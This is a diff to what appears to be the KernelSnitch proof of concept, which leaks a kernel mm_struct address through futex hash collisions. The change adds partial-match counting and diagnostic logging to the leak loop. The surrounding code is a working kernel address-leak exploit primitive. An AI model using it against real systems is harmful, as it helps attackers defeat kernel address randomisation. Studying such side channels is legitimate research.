@@ -91,6 +91,7 @@ struct kernelsnitch_shared_state {
 
     pthread_t *tids;
     size_t identity_diff;
+    volatile size_t diag_max_pass;
 
     enum kernelsnitch_state state;
 
@@ -209,9 +210,22 @@ static void *__mm_leak(void *arg)
 
                 size_t found_hash = 1;
                 if (!ks->mte_enabled) {
-                    // test the mm_struct candidate
-                    for (size_t i = 1; i < ks->collisions && found_hash; ++i)
-                        found_hash = (futex_hash(ks->futex_addrs[0], mm_struct_candidate) == futex_hash(ks->futex_addrs[i], mm_struct_candidate));
+                    // test the mm_struct candidate — count how many collisions agree
+                    size_t pass_count = 1;
+                    uint32_t h0 = futex_hash(ks->futex_addrs[0], mm_struct_candidate);
+                    for (size_t i = 1; i < ks->collisions; ++i) {
+                        if (futex_hash(ks->futex_addrs[i], mm_struct_candidate) == h0)
+                            pass_count++;
+                        else
+                            found_hash = 0;
+                    }
+                    // track best partial match for diagnostics (separate from identity_diff which is the chunk size)
+                    if (pass_count > ks->diag_max_pass) {
+                        ks->diag_max_pass = pass_count;
+                        if (ks->verbose && pass_count >= 4)
+                            pr_info("[diag] partial match %zu/%zu at mm=0x%016zx\n",
+                                    pass_count, ks->collisions, mm_struct_candidate);
+                    }
                     if (found_hash) {
                         ks->mm_struct = mm_struct_candidate;
                         ks->found = 1;
